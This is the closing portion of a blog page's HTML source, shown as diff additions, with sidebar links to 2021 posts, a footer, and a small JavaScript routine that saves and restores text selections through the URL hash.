+	<li><a href='/2021/have-you-ever-read-les-liaisons-dangereuses/' title='Have you ever read Les Liaisons dangereuses ?'>Have you ever read Les Liaisons dangereuses ?</a></li>
+	<li><a href='/2021/royal-revolt-ii-kicks-ass/' title='Royal Revolt II Kicks Ass!'>Royal Revolt II Kicks Ass!</a></li>
+	<li><a href='/2021/on-being-female-and-being-a-woman/' title='On being female, and being a woman.'>On being female, and being a woman.</a></li>
+	<li><a href='/2021/il-gatto-mammone/' title='Il gatto mammone'>Il gatto mammone</a></li>
+	<li><a href='/2021/hey-bitches-smell-my-armpits/' title='Hey bitches! Smell my armpits!'>Hey bitches! Smell my armpits!</a></li>
+	<li><a href='/2021/shield-for-murder/' title='Shield for murder'>Shield for murder</a></li>
+	<li><a href='/2021/moral-myopia/' title='Moral myopia'>Moral myopia</a></li>
+	<li><a href='/2021/amarcord/' title='Amarcord'>Amarcord</a></li>
+	<li><a href='/2021/la-minorenne/' title='La minorenne'>La minorenne</a></li>
+	<li><a href='/2021/the-deplorable-generation/' title='The deplorable generation'>The deplorable generation</a></li>
+	<li><a href='/2021/breaking-usg-president-belect-pidden-announces-plans-to-sign-epochal-factaltering-change-footnote-executive-history/' title='BREAKING : USG President-Belect Pidden Announces Plans To Sign Epochal Factaltering Change Footnote Executive History!'>BREAKING : USG President-Belect Pidden Announces Plans To Sign Epochal Factaltering Change Footnote Executive History!</a></li>
+</ul></li>
+                
+
+        
+<li class="pagenav"><h5>Pages</h5><ul><li class="page_item page-item-220"><a href="/archives-categories/" title="Archives &#038; Categories">Archives &#038; Categories</a></li>
+<li class="page_item page-item-34333"><a href="/contact-pgp/" title="Contact ; PGP">Contact ; PGP</a></li>
+<li class="page_item page-item-181"><a href="/copyright-notice/" title="Copyright Notice">Copyright Notice</a></li>
+<li class="page_item page-item-62578"><a href="/eulora-shop/" title="Eulora Shop">Eulora Shop</a></li>
+<li class="page_item page-item-94098"><a href="/in-the-press/" title="In the press">In the press</a></li>
+<li class="page_item page-item-39332"><a href="/thesaurus-vocabulary/" title="Thesaurus &#038; Vocabulary">Thesaurus &#038; Vocabulary</a></li>
+</ul></li>
+<h5>Say NO! to platforms</h5>      
+<center><a href=/2019/no-platforms/><img src=/wp-content/uploads/2019/08/no-facebook.png></img></a></center>
+
+                                                        </ul>
+        </div>
+
+        <div id="sidebar_bot">
+</div>
+
+<div id="banners">
+
+</div>
+</div>
+		</div>		
+<div id="footer">			
+<a href="/feed/" title="RSS Feed"><img src="/wp-content/themes/trilema/images/rss.jpg" alt="Subscribe RSS" class="rss"/>
+</a>		
+Copyright &copy; 2008 - 
+2026 for all text and images.			
+<br /> 
+Trilema is. Everything else's just hearsay. 
+
+
+</div>	
+</div>
+</div>
+
+	
+<script type="text/javascript">function findPos(obj) {
+  var curtop = 0;
+  while (obj && obj.offsetParent) {
+    curtop += obj.offsetTop; // todo: + webkit-transform
+    obj = obj.offsetParent;
+  }
+  return curtop;
+}
+var artificial = null;
+var prevhash = "";
+function scrollToHash() {
+  if (document.location.hash.replace(/^#/, "")==prevhash.replace(/^#/, ""))
+    return;
+  prevhash = document.location.hash;
+  if (document.location.hash.match(/#selection-[0-9.]+%/)) {
+    var p = parseFloat(document.location.hash.substring(1));
+    if (0 < p && p < 100 /*&& p%5 != 0*/) {
+      var content = document.getElementById("shash-55985")
+      var y = findPos(content) + (content.offsetHeight)*p/100;
+      window.scrollTo(0, y-16);
+    }
+  }
+
+  var adr = document.location.hash.match(/#selection-(\d+).(\d+)-(\d+).(\d+)/);
+  if (adr) {
+    var pos=0,begin=null,end=null;
+    function recur(e) {
+      if (e.nodeType==1) pos = (pos&~1)+2;
+      if (e.nodeType==3) pos = pos|1;
+      if (pos==adr[1]) begin=[e, adr[2]];
+      if (pos==adr[3]) end  =[e, adr[4]];
+      for (var i=0; i<e.childNodes.length; i++)
+        recur(e.childNodes[i]);
+      if (e.childNodes.length>0 && e.lastChild.nodeType==3)
+        pos = (pos&~1)+2;
+    }
+    // remove old "artificial" span if any
+    if (artificial) {
+      artificial.previousSibling.data += artificial.childNodes[0].data;
+      artificial.parentNode.removeChild(artificial);
+    }
+    var content = document.getElementById("shash-55985");
+    recur(content.childNodes[content.childNodes[0].nodeType==3 ? 1 : 0]);
+    if (begin!=null && end!=null) {
+      // scroll to selection
+      if (begin[0].nodeType==3) {
+        var text = document.createTextNode(begin[0].data.substr(0, begin[1]));
+        artificial = document.createElement("SPAN");
+        artificial.appendChild(document.createTextNode(begin[0].data.substr(begin[1])));
+
+        begin[0].parentNode.insertBefore(text, begin[0]);
+        begin[0].parentNode.replaceChild(artificial, begin[0]);
+
+        if (end[0]===begin[0])
+          end = [artificial.childNodes[0], end[1]-begin[1]];
+        begin = [artificial.childNodes[0], 0];
+        /* window.scrollTo(0, findPos(artificial)-8); */ artificial.scrollIntoView(true);
+      } else if (begin[0].nodeType==1) {
+        /* window.scrollTo(0, findPos(begin[0])-8);   */ begin[0].scrollIntoView(true);
+      }
+
+      if (window.getSelection) {
+        var sel = window.getSelection();
+        sel.removeAllRanges();
+        var range = document.createRange();
+        range.setStart(begin[0], begin[1]);
+        range.setEnd  (  end[0],   end[1]);
+        sel.addRange(range);
+      } else if (document.selection) { // IE
+      }
+    }
+  }
+}
+window.onhashchange = scrollToHash;
+var initScrollToHashDone = false;
+function initScrollToHash() {
+  if (!initScrollToHashDone) {
+    initScrollToHashDone = true;
+    scrollToHash();
+  }
+}
+window.onload = initScrollToHash;
+setTimeout(initScrollToHash, 500); /* onload can be delayed by counter code */
+
+//document.onselectionchange = /* only webkit has working document.onselectionchange */
+document.onmousedown = document.onmouseup = function(e) {
+  var newhash = "";
+  if (window.getSelection) {
+    var sel=window.getSelection();
+    if (!sel.isCollapsed) {
+      var pos=0,begin=[0,0],end=[0,0];
+      var range=sel.getRangeAt(0);
+      function recur(e) {
+        if (e===artificial) {
+          if (range.startContainer===e.childNodes[0]) begin=[pos, e.previousSibling.data.length+range.startOffset];
+          if (range.endContainer  ===e.childNodes[0]) end  =[pos, e.previousSibling.data.length+range.endOffset ];
+        } else {
+          if (e.nodeType==1) pos = (pos&~1)+2;
+          if (e.nodeType==3) pos = pos|1;
+          if (range.startContainer===e) begin=[pos, range.startOffset];
+          if (range.endContainer  ===e) end  =[pos, range.endOffset ];
+          for (var i=0; i<e.childNodes.length; i++)
+            recur(e.childNodes[i]);
+          if (e.childNodes.length>0 && e.lastChild.nodeType==3)
+            pos = (pos&~1)+2;
+        }
+      }
+
+      var content = document.getElementById("shash-55985");
+      recur(content.childNodes[content.childNodes[0].nodeType==3 ? 1 : 0]);
+      if (begin[0]>0 && end[0]>0) {
+        newhash = "selection-"+begin[0]+"."+begin[1]+"-"+end[0]+"."+end[1];
+      }
+    }
+  } else if (document.selection) { // IE
+  }
+
+  try {
+    var oldhash = location.hash.replace(/^#/, "");
+    if (oldhash != newhash) {
+      prevhash = newhash; /* avoid firing window.onhashchange and scrolling */
+      if (history.replaceState)
+        history.replaceState('', document.title, newhash=="" ? window.location.pathname : '#'+newhash);
+      else
+        location.hash = newhash;
+    }
+  } catch(e) {
+  }
+};
+</script></body></html>
